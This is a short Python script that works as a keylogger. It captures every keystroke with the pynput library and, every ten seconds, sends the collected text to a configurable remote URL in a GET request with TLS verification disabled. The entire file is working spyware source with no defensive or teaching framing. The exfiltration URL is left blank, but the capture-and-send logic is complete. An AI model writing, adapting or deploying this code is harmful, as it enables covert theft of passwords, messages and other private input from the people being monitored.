#!/usr/bin/python3

import pynput.keyboard
import sys
import requests
import threading

keylog = ""
ping_back_url = ""
poll_time = 10

def process_key(key):
    global keylog
    k = str(key).encode().decode("utf-8").replace("'", "")
    if k.lower() == "key.space":
        keylog = keylog + " "
    elif k.lower() == "key.enter":
        keylog = keylog + "\n"
    elif k.lower() == "key.backspace":
        keylog = keylog[:-1]
    else:
        keylog = keylog + k

def ping_back():
    global keylog
    global ping_back_url
    r = requests.get(ping_back_url + "?d=" + keylog, verify=False)
    keylog = ""
    timer = threading.Timer(poll_time, ping_back)
    timer.start()

def main():
    global keylog
    try:
        keyboard_listener = pynput.keyboard.Listener(on_press=process_key)
        with keyboard_listener:
            ping_back()
            keyboard_listener.join()
    except KeyboardInterrupt:
        print("Exited...")
        sys.exit(0)

if __name__ == "__main__":
    main()